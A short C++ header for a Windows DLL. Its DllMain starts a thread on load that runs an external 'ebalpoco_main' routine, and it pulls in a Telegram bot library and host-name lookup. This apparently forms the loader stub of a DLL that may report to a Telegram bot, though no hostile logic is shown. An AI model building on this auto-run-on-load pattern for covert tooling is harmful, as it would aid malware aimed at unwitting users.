#pragma once
#include <iostream>
#include <stdio.h>
#include <string>
#include <format>
#include <fstream>
#include <filesystem>
#include <tgbot/tgbot.h>
#include <boost/asio/ip/host_name.hpp>
#include "utils.h"

#pragma comment(lib, "user32.lib")

extern "C" void ebalpoco_main();

DWORD WINAPI thread_func(void* hModule) {
    ebalpoco_main();
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        HANDLE h = CreateThread(0, 0, thread_func, hinst, 0, 0);
        if (h)
            CloseHandle(h);
        else
            return FALSE;
    }

    return TRUE;
}